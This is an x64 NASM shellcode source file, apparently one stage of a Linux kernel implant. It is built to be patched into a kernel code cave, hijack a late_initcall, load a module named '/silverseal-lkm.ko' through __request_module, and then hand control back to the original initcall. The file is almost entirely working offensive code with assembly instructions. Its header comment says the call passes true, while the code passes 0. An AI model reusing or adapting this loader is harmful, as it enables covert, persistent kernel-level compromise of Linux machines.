; lkm_loader.asm
; Position-independent x64 shellcode executed as a Linux kernel late_initcall.
; Calls __request_module(true, "/silverseal-lkm.ko"), then tail-calls the
; original displaced initcall. Both function pointers contain magic sentinel
; values that the Rust loader scans for and patches before writing the blob
; into the kernel code cave.
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
;
; Blob layout (offsets from blob start):
;   [code]                  variable
;   [request_module_ptr]    8 bytes  <- sentinel 0xDEADBEEFDEADBEEF, patched to __request_module
;   [original_fn_ptr]       8 bytes  <- sentinel 0xCAFEBABECAFEBABE, patched to original initcall
;   [path_buffer]           256 bytes <- "/silverseal-lkm.ko\0" + zero padding

BITS 64
default rel

; ── Entry point ──────────────────────────────────────────────────────────────
; Calling convention: Linux x86-64 System V ABI
; On entry:  rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After one push: rsp % 16 == 0 (16-byte aligned before the call)

lkm_loader:
    push    rbp                     ; rsp: 8 → 0 (aligned for call below)

    mov     edi, 0                  ; arg1: wait = false
    lea     rsi, [path_buffer]      ; arg2: fmt = "/silverseal-lkm.ko"
    xor     eax, eax                ; al = 0 (variadic: no vector register args)
    call    [request_module_ptr]    ; __request_module(0, "/silverseal-lkm.ko")
                                    ; return value intentionally discarded

    pop     rbp
    jmp     [original_fn_ptr]       ; tail-call: original initcall's ret goes
                                    ; straight to the framework; eax propagated

; ── Patched pointer slots (magic sentinels; replaced by Rust before cave write) ──
request_module_ptr:
    dq      0xDEADBEEFDEADBEEF     ; patched to kernel vaddr of __request_module()

original_fn_ptr:
    dq      0xCAFEBABECAFEBABE     ; patched to kernel vaddr of displaced initcall

; ── Path buffer: 256 bytes total ──────────────────────────────────────────────
path_buffer:
    db      "/silverseal-lkm.ko", 0
    times   (256 - ($ - path_buffer)) db 0
